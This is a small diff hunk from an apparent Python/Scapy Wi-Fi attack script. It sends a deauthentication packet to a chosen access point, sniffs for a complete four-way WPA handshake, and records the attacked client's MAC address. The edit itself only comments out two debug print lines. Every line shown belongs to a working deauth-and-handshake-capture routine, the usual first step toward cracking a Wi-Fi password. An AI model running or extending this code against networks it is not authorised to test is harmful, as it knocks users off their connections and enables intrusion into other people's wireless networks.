@@ -126,9 +126,9 @@ deauth_packet=create_deauth_packet(sel_AP,ifacemon)
 sendp(deauth_packet, iface=ifacemon, count=1, inter=0.1) #sends 5 packets every 0.1 sec
 
 sniff(iface=ifacemon,prn=capture_handshake,store=0, timeout=15, stop_filter=lambda x: any(len(p) == 4 for p in handshakes.values()))
-print(handshakes)
+#print(handshakes)
 for mac in handshakes:
-    print(mac)
+    #print(mac)
     if(len(handshakes[mac])==4):
         mac_attacked=mac
         break
